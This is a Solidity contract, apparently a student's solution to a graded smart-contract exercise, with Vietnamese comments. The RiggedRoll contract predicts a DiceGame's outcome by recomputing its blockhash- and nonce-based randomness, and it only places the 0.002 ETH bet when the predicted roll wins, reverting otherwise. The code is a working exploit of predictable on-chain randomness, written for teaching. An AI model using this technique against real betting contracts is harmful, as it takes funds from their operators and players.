pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    //cho phép contract nhận ETH để có vốn
    receive() external payable {}

    //dự đoán sự ngẫu nhiên của hàm gốc
    function riggedRoll() public {
        //Side Quest: Kiểm tra xem có đủ tiền cược (0.002 ETH) không
        require(address(this).balance >= .002 ether, "Contract khong du tien de cuoc!");

        //copy y nguyên từ DiceGame.sol + diceGame.nonce() vì biến nonce nằm bên contract kia
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("THE PREDICTED ROLL IS: ", roll);
        
        if (roll <= 5) {
            //nếu thắng thì gọi hàm và gửi tiền thật
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            //nếu thua thì revert để báo lỗi và không mất tiền cược
            revert("Keo nay thua, huy lenh!");
        }
    }

    //Hàm rút tiền, chỉ owner mới được gọi
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Khong du tien trong contract");
        
        //Thực hiện chuyển tiền
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Rut tien that bai");
    }

}
